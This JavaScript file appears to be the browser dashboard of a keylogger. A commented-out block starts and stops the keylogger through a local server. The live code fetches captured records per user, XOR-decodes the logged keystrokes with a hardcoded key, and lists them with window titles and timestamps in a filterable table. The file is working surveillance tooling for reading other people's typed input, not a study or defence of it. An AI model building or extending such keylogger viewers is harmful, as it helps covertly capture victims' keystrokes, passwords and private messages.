// let isRunning = false;

// async function toggleKeylogger() {
//     const url = isRunning ? 'http://127.0.0.1:5000/stop_keylogger' : 'http://127.0.0.1:5000/start_keylogger';
//     try {
//         const response = await fetch(url);
//         const result = await response.json();
//         isRunning = !isRunning;
//         const button = document.getElementById('toggleKeylogger');
//         button.textContent = isRunning ? 'Stop' : 'Start';
//         button.classList.toggle('stop', isRunning);
//         const recordingIndicator = document.querySelector('.recording-indicator');
//         recordingIndicator.style.display = isRunning ? 'flex' : 'none';
//         if (isRunning) {
//             startTimer();
//         } else {
//             stopTimer();
//             window.location.reload();
//         }
//     } catch (error) {
//         console.error('Error:', error);
//         alert('Failed to toggle keylogger');
//     }
// }

// function startTimer() {
//     const timerElement = document.getElementById('timer');
//     timerElement.textContent = '00:00';
//     timerElement.style.display = 'inline';
//     seconds = 0;
//     timerInterval = setInterval(() => {
//         seconds++;
//         const minutes = Math.floor(seconds / 60);
//         const remainingSeconds = seconds % 60;
//         timerElement.textContent = `${pad(minutes)}:${pad(remainingSeconds)}`;
//     }, 1000);
// }

// function stopTimer() {
//     clearInterval(timerInterval);
//     const timerElement = document.getElementById('timer');
//     timerElement.style.display = 'none';
// }

// function pad(number) {
//     return number < 10 ? '0' + number : number;
// }


let gridApi;

async function fetchData() {
    try {
        const response = await fetch('http://127.0.0.1:5000/data');
        const data = await response.json();

        const users = [...new Set(data.map(entry => entry.user))];

        const userSelect = document.querySelector('#userSelect');
        userSelect.innerHTML = '<option value="">Select User</option>' + 
            users.map(user => `<option value="${user}">${user}</option>`).join('');

        function updateGrid(selectedUser) {
            document.querySelector('#user').innerHTML = selectedUser + " All data:" || 'All Users';
            const filteredData = selectedUser ? 
                data.filter(entry => entry.user === selectedUser) : data;

            const rowData = filteredData.flatMap(entry =>
                Object.entries(entry.timestamps).map(([timestamp, value]) => ({
                    window: entry.window,
                    timestamp: timestamp,
                    logs: xorDecrypt(value)
                }))
            );

            if (gridApi) {
                gridApi.setGridOption("rowData", rowData);
            }
        }

        const gridOptions = {
            columnDefs: [
                { headerName: "ID", valueGetter: (params) => params.node.rowIndex + 1, flex: 1 },
                { headerName: 'Window', field: 'window', filter: 'agTextColumnFilter', flex: 2 },
                { headerName: 'Timestamp', field: 'timestamp', filter: 'agTextColumnFilter', flex: 2 },
                { headerName: 'Logs', field: 'logs', filter: 'agTextColumnFilter', flex: 8 }
            ],
            defaultColDef: {
                sortable: true,
                filter: true,
                resizable: true,
                headerClass: 'header-center'
            },
            rowData: [],
            pagination: true,
            paginationPageSize: 10,
            paginationPageSizeSelector: [10, 20, 50, 100],
            domLayout: 'autoHeight',
            onGridReady: (params) => {
                gridApi = params.api;
                updateGrid(userSelect.value);
            }
        };

        const eGridDiv = document.querySelector('#myGrid');
        gridApi = agGrid.createGrid(eGridDiv, gridOptions);

        userSelect.addEventListener('change', (event) => updateGrid(event.target.value));
    } catch (error) {
        console.error('Error fetching data:', error);
    }
}


function xorDecrypt(hexText, key = "thisIsMyXorKey") {
    const text = hexToString(hexText);
    const keyCycle = key.repeat(Math.ceil(text.length / key.length)).slice(0, text.length);
    return text.split('').map((char, i) =>
        String.fromCharCode(char.charCodeAt(0) ^ keyCycle.charCodeAt(i))
    ).join('');
}

function hexToString(hex) {
    return hex.match(/.{1,2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
}

window.addEventListener('load', function () {
    fetchData();
});
